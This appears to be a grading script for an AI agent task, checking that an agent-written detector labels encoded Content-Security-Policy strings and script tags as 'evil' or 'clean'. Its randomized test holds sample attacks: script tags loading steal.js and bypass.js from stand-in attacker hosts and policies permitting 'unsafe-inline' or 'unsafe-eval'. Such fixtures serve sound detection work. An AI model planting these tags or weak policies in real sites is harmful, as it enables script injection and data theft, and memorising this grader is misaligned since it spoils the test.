#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import base64
import json
import os
import random
import secrets
import subprocess
import tempfile
import pytest

AGENT_SCRIPT = "/home/user/payload_detector.py"
REPORT_FILE = "/home/user/report.json"
EVIL_DIR = "/app/corpora/evil/"
CLEAN_DIR = "/app/corpora/clean/"


def run_agent_script(corpus_dir):
    if os.path.exists(REPORT_FILE):
        os.remove(REPORT_FILE)

    return subprocess.run(
        ["python3", AGENT_SCRIPT, corpus_dir],
        capture_output=True,
        text=True,
        timeout=30,
    )


def load_report(corpus_dir):
    run_agent_script(corpus_dir)
    assert os.path.exists(REPORT_FILE), (
        f"Report file missing at {REPORT_FILE} after running script on {corpus_dir}."
    )
    with open(REPORT_FILE, "r") as f:
        try:
            report = json.load(f)
        except json.JSONDecodeError:
            pytest.fail(f"Report file {REPORT_FILE} is not valid JSON.")
    assert isinstance(report, dict), "Report must be a JSON object."
    return report


def encode(text):
    xored = bytes(b ^ 0x55 for b in text.encode("utf-8"))
    return base64.b64encode(xored[::-1]).decode("ascii")


def test_payload_detector_script_exists():
    assert os.path.exists(AGENT_SCRIPT), f"Agent script missing at {AGENT_SCRIPT}"
    assert os.path.isfile(AGENT_SCRIPT), f"Expected a file at {AGENT_SCRIPT}"


def test_evil_corpus_classification():
    assert os.path.exists(EVIL_DIR), f"Evil corpus missing at {EVIL_DIR}"
    report = load_report(EVIL_DIR)
    evil_files = [
        f for f in os.listdir(EVIL_DIR)
        if os.path.isfile(os.path.join(EVIL_DIR, f))
    ]

    bypassed_files = []
    missing_files = []
    for f in evil_files:
        if f not in report:
            missing_files.append(f)
        elif report[f] != "evil":
            bypassed_files.append(f)

    error_msg = ""
    if bypassed_files:
        error_msg += (
            f"{len(bypassed_files)} of {len(evil_files)} evil bypassed: "
            f"{', '.join(bypassed_files)}. "
        )
    if missing_files:
        error_msg += (
            f"{len(missing_files)} files missing from report: "
            f"{', '.join(missing_files)}."
        )
    if error_msg:
        pytest.fail(error_msg.strip())


def test_clean_corpus_classification():
    assert os.path.exists(CLEAN_DIR), f"Clean corpus missing at {CLEAN_DIR}"
    report = load_report(CLEAN_DIR)
    clean_files = [
        f for f in os.listdir(CLEAN_DIR)
        if os.path.isfile(os.path.join(CLEAN_DIR, f))
    ]

    modified_files = []
    missing_files = []
    for f in clean_files:
        if f not in report:
            missing_files.append(f)
        elif report[f] != "clean":
            modified_files.append(f)

    error_msg = ""
    if modified_files:
        error_msg += (
            f"{len(modified_files)} of {len(clean_files)} clean modified "
            f"(classified as evil or other): {', '.join(modified_files)}. "
        )
    if missing_files:
        error_msg += (
            f"{len(missing_files)} files missing from report: "
            f"{', '.join(missing_files)}."
        )
    if error_msg:
        pytest.fail(error_msg.strip())


def test_randomized_mixed_corpus_classification():
    token = secrets.token_hex(8)
    evil_payloads = [
        f"default-src 'self'; script-src 'unsafe-inline' https://cdn.{token}.example",
        f"script-src 'self' 'unsafe-eval'; object-src 'none'; report-uri /{token}",
        f'<script src="https://{token}.attacker.invalid/steal.js" nonce="fixed-{token}"></script>',
        f"object-src 'none'; script-src https://{token}.evil.invalid",
        f"script-src 'unsafe-inline'; connect-src https://{token}.attacker.invalid",
        f'<script src="http://attacker.invalid/{token}/bypass.js"></script>',
    ]
    clean_payloads = [
        f"default-src 'self'; img-src https://images.trusted.com/{token};",
        f"script-src 'self' https://apis.google.com; report-uri /reports/{token}",
        f"default-src 'none'; script-src 'self'; style-src 'self'",
        f"default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
        f"script-src 'self' 'nonce-{token}'; object-src 'none'",
        f"connect-src 'self' https://api.trusted.com/{token}; default-src 'self'",
    ]

    cases = [(payload, "evil") for payload in evil_payloads]
    cases += [(payload, "clean") for payload in clean_payloads]
    random.SystemRandom().shuffle(cases)

    with tempfile.TemporaryDirectory(prefix="payload-check-") as corpus_dir:
        expected = {}
        for payload, label in cases:
            filename = f"item_{secrets.token_hex(10)}.txt"
            expected[filename] = label
            with open(os.path.join(corpus_dir, filename), "w") as f:
                f.write(encode(payload))

        report = load_report(corpus_dir)
        missing = [name for name in expected if name not in report]
        wrong = [
            name for name, label in expected.items()
            if name in report and report[name] != label
        ]
        assert not missing, f"Files missing from randomized report: {', '.join(missing)}"
        assert not wrong, (
            "Incorrect classifications in randomized mixed corpus: "
            + ", ".join(
                f"{name} expected {expected[name]!r}, got {report[name]!r}"
                for name in wrong
            )
        )
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
